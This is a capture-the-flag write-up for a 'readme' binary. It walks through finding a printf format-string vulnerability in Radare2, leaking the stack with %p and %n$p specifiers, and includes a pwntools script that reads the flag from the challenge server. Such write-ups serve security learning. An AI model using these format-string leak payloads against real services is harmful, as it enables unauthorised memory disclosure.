# Readme

In this challenge you are provided a binary `readme` and a link to a remote server running it, and your task is to pwn the remote binary.

First, I tried running the program but it immediately resulted in a segmentation fault.
So, I opened it up in Radare2 and seek to `main`'s disassembly, finding that it calls the `vuln` function.
In `vuln`, it tries to open up a file `flag.txt` with no error checking.
So, I created a file `flag.txt` with a fake flag in it `dctf{demoflaghere}` and ran the program to get the following results, where my input was `a`:
```
$ ./readme
hello, what's your name?
a
hello a
```

Going back into r2, I found that in `0x00008ea` a call to `printf()` is made with a directly user-supplied string of size `0x1e`:
```
│           0x000008bc      488d45d0       lea rax, [format]
│           0x000008c0      be1e000000     mov esi, 0x1e
│           0x000008c5      4889c7         mov rdi, rax
│           0x000008c8      e853feffff     call sym.imp.fgets          ;[2] ; char *fgets(char *s, int size, FILE *stream)
│           0x000008cd      488d3d040100.  lea rdi, str.hello_         ; 0x9d8 ; "hello " ; const char *format
│           0x000008d4      b800000000     mov eax, 0
│           0x000008d9      e822feffff     call sym.imp.printf         ;[5] ; int printf(const char *format)
│           0x000008de      488d45d0       lea rax, [format]
│           0x000008e2      4889c7         mov rdi, rax                ; const char *format
│           0x000008e5      b800000000     mov eax, 0
│           0x000008ea      e811feffff     call sym.imp.printf         ;[5] ; int printf(const char *format)
```


So, I started enumerating the stack after the buffer using `echo '%p%p%p%p.%p%p%p%p.%p%p%p%p' | nc dctf-chall-readme.westeurope.azurecontainer.io 7481`, where `%p` is the printf format specifier for viewing memory addresses.
The results:
```
hello, what's your name?
hello 0x7ffc182d77d0(nil)(nil)0x6.0x6(nil)0x564e228c52a00x77306e7b66746364.0x646133725f30675f0x30625f656d30735f0x7f6300356b300x7025702570257025
```
The stack on my computer stays around `0x7f...` and the base for PIE binaries stays around `0x55...`, so, ruling those out, we have some interesting bytes in the 8th parameter `0x77306e7b66746364`.
Decoding this in Python (`bytes.fromhex('77306e7b66746364')`) we are left with `b'w0n{ftcd'`, which is the first part of our flag, but backwards due to the racketeers over at the little-endian lobby.

While we can use '%p%p%p...' to access our 8th parameter, it is a lot cleaner to use `%n$p`, where `n` is the number of the argument to access.
Also keep in mind that we can't use the '%s' specifier, as these are ASCII bytes, not pointers to ASCII.

So, putting this all together in a Python script:
```python
from pwn import *
r = remote('dctf-chall-readme.westeurope.azurecontainer.io', 7481)

payload = '%8$p.%9$p.%10$p.%11$p.END'

r.sendline(payload)
r.recvuntil('hello ')

res = r.recvuntil('.END')
res = res.split(b'.')[:-1]

out = b''
for i in res:
    out += bytes.fromhex(i[2:].decode())[::-1]
print(out.decode(errors='ignore'))
```

This returns our flag, but in a slightly mangled format because it seems the program just doesn't store the ending brace.
